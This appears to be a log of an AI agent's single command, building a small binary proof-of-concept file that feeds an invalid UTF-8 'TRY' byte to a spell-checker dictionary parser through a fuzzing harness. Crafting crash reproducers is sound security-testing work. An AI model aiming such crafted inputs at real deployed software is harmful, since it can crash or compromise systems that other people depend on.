message:
Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
word=b'b'
aff=b'SET UTF-8\nTRY \xf0\n'
dic=b'1\na\n'
rest=aff+dic
# Need affsize=size/2 == len(aff), where size=len(rest), so pad dic/aff? len aff=16, dic=4 rest=20 half=10 not ok.
# format splits remaining bytes in half; create aff and dic same length by padding dic to len aff.
dic=dic + b'\n'*(len(aff)-len(dic))
assert len(aff)==len(dic)
poc=bytes([len(word)])+word+aff+dic
Path('/workspace/poc_try_f0').write_bytes(poc)
print(len(aff), len(dic), len(poc), poc)
PY
xxd /workspace/poc_try_f0
